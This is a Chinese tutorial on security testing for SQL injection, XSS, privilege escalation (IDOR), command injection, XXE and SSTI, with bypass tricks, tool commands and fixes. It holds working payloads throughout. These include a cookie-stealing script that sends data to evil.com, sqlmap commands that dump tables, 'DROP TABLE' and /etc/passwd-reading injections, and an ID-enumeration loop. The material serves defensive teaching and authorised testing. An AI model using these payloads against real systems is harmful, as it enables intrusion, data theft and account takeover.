---
breadcrumbExclude: true
title: 注入攻击：SQL 注入、XSS 与越权详解及测试实战
date: 2026-08-24
tags:
  - SQL注入
  - XSS
  - 越权
  - 安全测试
  - OWASP
---

# 注入攻击：SQL 注入、XSS 与越权详解及测试实战

注入（Injection）是 OWASP Top 10 中长期霸榜的一类漏洞。攻击者把**恶意代码"注入"到输入数据中**，让程序将其当作指令执行——SQL 注入让数据库沦为提款机，XSS 让浏览器变成攻击者的傀儡，命令注入直接接管服务器。而越权（IDOR）虽非严格意义的"注入"，却是 Web 应用最普遍的数据安全漏洞之一。

本文聚焦 SQL 注入、XSS、越权三大漏洞，从原理、类型、绕过技巧到测试工具与防护，给出可落地的安全测试指引。

## 一、注入攻击概述

**注入的本质**：应用程序将**不可信的用户输入**拼接到**可解释的代码/查询**中，且未做有效隔离，导致输入被当作代码执行。

```text
不可信输入 ──拼接──> SQL/HTML/命令/模板
                        │
                        ▼
                 当作代码执行 ──> 数据泄露/篡改/接管
```

**注入面**：凡是接收外部输入并参与"解析执行"的位置都是注入面——SQL 查询、HTML 输出、系统命令、模板引擎、XML 解析、LDAP 查询等。

## 二、SQL 注入

### 2.1 原理

当程序用字符串拼接方式构造 SQL，而未使用参数化查询时，用户输入可"闭合"原有语句并追加恶意 SQL：

```java
// 存在漏洞的写法：字符串拼接
String sql = "SELECT * FROM users WHERE name = '" + name + "' AND pwd = '" + pwd + "'";
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery(sql);
```

攻击者输入用户名 `admin' --`（`--` 为 MySQL 注释符，注释掉后面的 `AND pwd = ...`），最终执行的 SQL 变为：

```sql
SELECT * FROM users WHERE name = 'admin' -- ' AND pwd = 'xxx'
```

密码校验被注释掉，攻击者无需密码即可登录。

### 2.2 SQL 注入类型

| 类型 | 原理 | 示例载荷 | 判定特征 |
|---|---|---|---|
| 联合查询注入 | 用 `UNION` 合并查询结果，回显其他表数据 | `' UNION SELECT username,password FROM users--` | 页面回显注入列数据 |
| 布尔盲注 | 通过页面是否正常判断条件真假 | `' AND 1=1--` vs `' AND 1=2--` | 响应差异 |
| 时间盲注 | 通过响应延迟判断条件 | `' AND SLEEP(5)--` | 响应延迟 5 秒 |
| 报错注入 | 利用数据库报错信息带出数据 | `' AND updatexml(1,concat(0x7e,version()),1)--` | 报错中回显数据 |
| 堆叠注入 | 以 `;` 分隔执行多条语句 | `'; DROP TABLE users;--` | 多条语句被执行 |
| 宽字节注入 | 利用 GBK 编码绕过 `\` 转义 | `%df'`（宽字符吃掉转义符） | 经典老系统 |

**判断注入点的经典三步**：

```text
第一步 探测：加单引号 '，观察是否报错/异常
第二步 验证：' and 1=1 正常，' and 1=2 异常 → 存在布尔注入
第三步 利用：UNION 查询 / 时间盲注 / 工具（sqlmap）自动化
```

### 2.3 常见绕过技巧

| 绕过目标 | 手法 |
|---|---|
| 空格过滤 | 用 `/**/`、`%09`、`%0a` 代替空格：`'/**/or/**/1=1` |
| 关键字过滤 | 大小写混写 `Or`、双重编码 `%27`、注释切分 `sel/**/ect` |
| 引号过滤 | 十六进制编码字符串：`0x61646d696e` |
| 后端 WAF | 编码变形、分块请求、参数污染（HPP） |
| 逗号过滤 | 用 `from x for y` 语法替代部分函数参数 |

> 测试提示：绕过技巧说明**过滤器不等于安全**，只要底层仍用拼接，就存在可绕过的空间，根治必须用参数化查询。

### 2.4 SQL 注入测试实战

**手工验证（推荐先用这个）**：

```http
GET /api/user/search?name=admin' HTTP/1.1
GET /api/user/search?name=admin' AND 1=1-- HTTP/1.1   # 期望：正常
GET /api/user/search?name=admin' AND 1=2-- HTTP/1.1   # 期望：无结果/异常
```

**工具：sqlmap**（自动化检测与利用）：

```bash
# 基础检测
sqlmap -u "https://target.com/api/user?id=1" --batch

# 指定数据库类型并提取数据
sqlmap -u "https://target.com/api/user?id=1" --dbms=mysql \
  -D database_name -T users --dump

# 表单注入（POST）
sqlmap -u "https://target.com/api/login" --data="name=admin&pwd=123" --batch

# 带 Cookie/Token
sqlmap -u "https://target.com/api/user?id=1" --cookie="session=xxxx" --batch
```

> 风险提示：注入测试会产生真实数据库副作用（写操作、删表），**只能在授权环境执行**，生产环境务必先确认测试范围与备份。

### 2.5 SQL 注入防护

- **参数化查询 / 预编译**（根治）：

```java
// 安全的写法：PreparedStatement 参数绑定
String sql = "SELECT * FROM users WHERE name = ? AND pwd = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);
ps.setString(2, pwd);
```

```python
# Python: 参数化
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
```

- 输入白名单校验（类型、长度、格式）；
- 最小数据库权限：应用账号禁用 `DROP/GRANT/超级管理` 权限；
- 报错信息脱敏，不向用户展示原始 SQL 错误；
- 存储过程也要注意参数拼接问题；
- 定期用 SQLMap/商业化扫描器回归。

## 三、XSS 跨站脚本

### 3.1 原理与危害

**XSS（Cross-Site Scripting）**：攻击者将恶意脚本注入网页，在**受害者的浏览器**中执行。由于脚本拥有受害者同源权限，可窃取 Cookie、Token、页面内容，进而**账号接管**。

```html
<!-- 攻击者构造的注入内容 -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

### 3.2 XSS 类型

| 类型 | 触发时机 | 特点 | 危害范围 |
|---|---|---|---|
| 反射型 XSS | 恶意脚本随请求"反射"回响应，需诱导点击链接 | 一次性、非持久 | 单个受害者 |
| 存储型 XSS | 脚本先存入数据库，任何用户浏览该页面时触发 | 持久、传播广 | 所有访问者（含管理员） |
| DOM 型 XSS | 前端 JavaScript 直接操作 DOM，服务端无感知 | 隐蔽、难发现 | 使用该页面的用户 |

**典型反射型示例**：

```http
GET /search?kw=<script>alert(document.cookie)</script>
```

响应中 `<input value="<script>alert(document.cookie)</script>">` 直接回显未转义。

**存储型典型场景**：评论区、昵称、留言板——提交恶意脚本，后台管理页浏览即中招。

**DOM 型典型场景**：

```javascript
// 漏洞代码：把 URL 参数直接插入 innerHTML
var name = location.hash.substring(1);
document.getElementById("welcome").innerHTML = "Hello " + name;
```

### 3.3 XSS 绕过技巧

| 过滤 | 绕过 |
|---|---|
| 过滤 `<script>` | 用 `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>` |
| 过滤 `<`、`>` | 用事件属性/伪协议：`<a href="javascript:alert(1)">`、`onmouseover` |
| 过滤关键字 | 大小写、编码（`&#x61;`）、`String.fromCharCode` |
| 过滤引号 | 反引号、无引号属性写法 |
| CSP 过滤 | 寻找 JSONP、`<iframe>`、白名单绕过 |

### 3.4 XSS 测试与工具

**手工验证**：

```http
# 基础探测
GET /search?kw=<script>alert(1)</script>
GET /search?kw=<img src=x onerror=alert(document.domain)>
GET /search?kw="><svg/onload=alert(1)>
```

**浏览器 Payload 观察点**：响应中参数是否原样回显、是否被转义、上下文（标签内/属性内/script 内）不同绕过方式不同。

**工具**：

- **Burp Scanner**：自动扫描反射/存储型 XSS；
- **XSStrike**：上下文感知的 XSS 检测与绕过工具；
- **OWASP ZAP**：免费开源扫描；
- 浏览器 DevTools：手工验证 DOM 型 XSS。

### 3.5 XSS 防护

- **输出编码（根本）**：根据输出上下文（HTML 标签/属性/JavaScript/URL）选择对应编码，推荐成熟的模板引擎自动转义；
- **内容安全策略 CSP**：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

- **Cookie 加 `HttpOnly`**（防脚本读取）+ `Secure` + `SameSite`；
- **输入过滤**：白名单校验富文本（用 DOMPurify 等清洗）；
- 前端框架（Vue/React）默认转义，避免滥用 `v-html`/`dangerouslySetInnerHTML`。

## 四、越权访问

### 4.1 水平越权（IDOR / BOLA）

**定义**：同级别用户之间越权访问，通常通过修改资源 ID。

```http
# 用户 A 访问自己的订单
GET /api/order/10001
# 用户 A 把 ID 改成 10002（用户 B 的订单），仍返回数据 → 水平越权
GET /api/order/10002
```

**成因**：后端只校验登录态，未校验"该资源是否属于当前用户"。

### 4.2 垂直越权

**定义**：低权限用户执行高权限操作，如普通用户调用管理接口。

```http
GET /api/admin/users                  # 普通用户直接调用 → 应 403
POST /api/admin/deleteUser?id=123     # 前端隐藏了按钮，但接口没鉴权
```

**成因**：只在前端控制权限；后端方法级权限注解缺失/配置错误。

### 4.3 越权测试方法

```text
1. 准备账号：普通用户 A、普通用户 B、管理员 C
2. 水平越权：A 的 Token 请求 B 的资源 ID，观察是否返回 B 的数据
3. 垂直越权：A 的 Token 请求管理员接口，观察是否 403
4. 遍历 ID：脚本批量遍历资源 ID（订单/用户/文件/优惠券）
5. 修改请求体字段：userId、role、orgId、status，观察服务端是否信任
6. 关注批量接口：列表、导出、搜索是否按用户隔离
```

```bash
# 遍历 ID 检测水平越权
for id in $(seq 10001 10020); do
  resp=$(curl -s "https://api.example.com/order/$id" \
    -H "Authorization: Bearer <A的Token>")
  echo "$id => $resp" | grep -q '"data"' && echo "ID $id 越权成功！"
done
```

**工具**：Burp 插件 `Autorize`（低权限 Token 一键重放所有请求，标红即越权）、`AuthMatrix`。

### 4.4 越权防护

- **服务端强制对象级授权**：每个资源访问都校验 owner/租户归属；
- **数据按用户过滤**：SQL 层强制追加 `WHERE user_id = 当前登录用户`；
- **不信任客户端参数**：userId/role 一律以服务端会话为准；
- **方法级权限注解**：如 Spring Security 的 `@PreAuthorize("hasRole('ADMIN')")`；
- **默认拒绝**：未显式授权的一律拒绝。

## 五、其他常见注入

### 5.1 命令注入（Command Injection）

拼接用户输入执行系统命令：

```java
// 漏洞代码
String cmd = "ping -c 4 " + host;
Process p = Runtime.getRuntime().exec(cmd);
```

```bash
# 注入示例：host 传入 127.0.0.1; cat /etc/passwd
ping -c 4 127.0.0.1; cat /etc/passwd
```

**测试**：`;`、`|`、`&&`、`` ` ``、`$()` 等分隔符 + `id`、`whoami` 探测。**防护**：禁止拼接系统命令，改用安全 API/白名单参数。

### 5.2 XXE（XML 外部实体注入）

XML 解析器允许加载外部实体时，可读取本地文件/内网：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

**测试**：对 XML 接口（SOAP、文件上传解析）构造上述 Payload。**防护**：禁用外部实体（`setFeature` 关闭 DTD/外部实体）。

### 5.3 SSTI 模板注入

模板引擎将用户输入当模板渲染：

```python
# Flask/Jinja2 漏洞示例
return render_template_string("Hello " + user_input)
```

```text
{{ 7*7 }}                # 输出 49 说明存在模板注入
{{ ''.__class__.__mro__[1].__subclasses__() }}   # 探测可利用类
```

**防护**：业务数据不得拼接进模板；模板渲染关闭危险过滤器。

### 5.4 LDAP / 其他注入

LDAP 注入、XPATH 注入、CRLF 注入（响应头拆分）原理相同——**不可信输入拼接进可解释语句**。统一防护原则：参数化/转义 + 白名单 + 最小权限。

## 六、注入攻击测试用例清单

| 编号 | 漏洞 | 测试点 | 操作 | 期望 |
|---|---|---|---|---|
| INJ-01 | SQL 注入 | 所有带参数的 GET/POST | `'`、`' AND 1=1--`、UNION | 无数据泄露 |
| INJ-02 | SQL 注入 | 登录/搜索/排序/导出 | sqlmap 自动化检测 | 无注入 |
| INJ-03 | SQL 注入 | 绕过测试 | 编码/注释/大小写绕过 | 过滤不生效仍安全 |
| INJ-04 | 存储型 XSS | 昵称/评论/留言 | 提交 `<script>`、`<img onerror>` | 存储后转义输出 |
| INJ-05 | 反射型 XSS | 搜索/错误回显参数 | `<script>alert(1)</script>` | 回显被转义 |
| INJ-06 | DOM 型 XSS | URL 参数操作 DOM 处 | `#"><img onerror=alert(1)>` | 不执行脚本 |
| INJ-07 | 水平越权 | 资源 ID 类接口 | A 的 Token 访问 B 的 ID | 403 |
| INJ-08 | 垂直越权 | 管理功能接口 | 普通账号调用 admin 接口 | 403 |
| INJ-09 | 批量接口越权 | 列表/导出/搜索 | 检查是否按用户过滤 | 仅返回本人数据 |
| INJ-10 | 命令注入 | ping/执行类功能 | `;id`、`|whoami` | 不执行 |
| INJ-11 | XXE | XML 接口/文件上传 | DOCTYPE 外部实体读取文件 | 拒绝 |
| INJ-12 | SSTI | 模板渲染点 | `{{7*7}}` | 输出字面量 |

## 七、总结

- **三大漏洞一句话**：SQL 注入是"数据当 SQL 执行"、XSS 是"数据当脚本执行"、越权是"校验了身份但没校验归属"；
- **测试优先级**：SQL 注入先手工后 sqlmap；XSS 按输出上下文测绕过；越权用"双账号互访 + ID 遍历 + 字段篡改"三板斧；
- **根治之道**：参数化查询、输出编码、服务端对象级授权——三者分别是 SQL 注入、XSS、越权的银弹；
- **过滤 ≠ 安全**：任何"黑名单过滤"都能被绕过，必须从架构层面隔离"数据"与"代码"；
- 所有注入测试都应在**授权与隔离环境**中进行，避免产生真实破坏。

> 延伸阅读：《接口安全》提供接口安全测试用例清单与 OWASP API Top 10；《认证授权》详解 JWT/OAuth2 与授权模型；《数据泄露》详解敏感数据保护。
